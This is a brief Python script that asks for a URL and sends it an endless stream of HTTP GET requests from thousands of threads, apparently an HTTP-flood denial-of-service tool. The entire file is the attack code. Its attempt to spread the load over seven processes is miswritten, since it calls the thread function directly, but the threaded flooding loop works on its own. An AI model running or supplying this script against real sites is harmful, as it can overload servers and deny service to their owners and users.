import threading as t
import multiprocessing as mp
import requests

if __name__ == '__main__':
    url = input('Enter url : ')
    i = 0
    def send_request(url, i):
        try:
            r = requests.get(url)
            print(f"{i}# {url} : state --> [{r.status_code}]")
        except Exception as e:
            if ':' in str(e):
                print(">> Exception : " + str(e).split(':')[1])
            else:
                print(">> Exception : " + str(e))


    def thread():
        while True:
            for i in range(1,1500):
                thraed = t.Thread(target=send_request, args=(url, i,))
                thraed.start()


    for i in range(7):
        p1 = mp.Process(target=thread())
        p1.start()


